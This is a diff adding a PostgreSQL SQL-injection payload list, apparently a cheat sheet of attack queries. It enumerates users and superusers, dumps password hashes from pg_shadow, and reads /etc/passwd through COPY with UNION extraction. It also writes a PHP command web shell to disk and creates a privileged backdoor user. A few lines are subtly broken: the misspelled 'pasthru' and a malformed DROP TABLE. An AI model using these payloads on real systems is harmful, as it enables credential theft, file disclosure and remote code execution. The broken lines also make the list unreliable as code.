@@ -1,0 +1,36 @@
+ SELECT pg_sleep(10);
+ SELECT version()
+ SELECT user; 
+ SELECT current_user; 
+ SELECT session_user; 
+ SELECT usename FROM pg_user;
+ SELECT getpgusername();
+ SELECT usename FROM pg_user;
+ SELECT usename, passwd FROM pg_shadow;
+ SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user;
+ SELECT usename FROM pg_user WHERE usesuper IS TRUE
+ SELECT inet_server_addr();
+ SELECT inet_server_port();
+ SELECT current_setting('data_directory');
+ SELECT current_setting('hba_file');
+ SELECT current_database()
+ SELECT datname FROM pg_database
+ SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') 
+ SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) 
+ SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '%GuessCommonColumnName%'; 
+ SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0;
+ SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;
+ CREATE TABLE mydata(t text);
+ COPY mydata FROM '/etc/passwd';
+ ...' UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1;
+ ...' UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2;
+ DROP TABLE mytest mytest;
+ CREATE TABLE mytable (mycol text);
+ INSERT INTO mytable(mycol) VALUES ('<? pasthru($_GET[cmd]); ?>');
+ COPY mytable (mycol) TO '/tmp/test.php';
+ CREATE USER HR PASSWORD 'Zer0Lulz';
+ CREATE USER HR PASSWORD 'Zer0Lulz' CREATEUSER;
+ ALTER USER HR CREATEUSER CREATEDB;
+ DROP USER HR;
+ 
+ 
